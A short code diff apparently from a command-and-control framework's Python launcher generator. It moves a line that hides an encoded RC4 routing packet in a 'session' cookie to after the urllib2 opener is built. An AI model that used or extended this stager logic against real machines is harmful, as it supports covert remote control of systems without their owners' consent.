@@ -269,8 +269,6 @@ class Listener:
                 routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='PYTHON', meta='STAGE0', additional='None', encData='')
                 b64RoutingPacket = base64.b64encode(routingPacket)
 
-                # add the RC4 packet to a cookie
-                launcherBase += "o.addheaders=[('User-Agent',UA), (\"Cookie\", \"session=%s\")];\n" % (b64RoutingPacket)
                 launcherBase += "import urllib2\n"
 
                 if proxy.lower() != "none":
@@ -294,6 +292,9 @@ class Listener:
                 else:
                     launcherBase += "o = urllib2.build_opener();\n"
 
+                # add the RC4 packet to a cookie
+                launcherBase += "o.addheaders=[('User-Agent',UA), (\"Cookie\", \"session=%s\")];\n" % (b64RoutingPacket)
+                
                 #install proxy and creds globally, so they can be used with urlopen.
                 launcherBase += "urllib2.install_opener(o);\n"
 
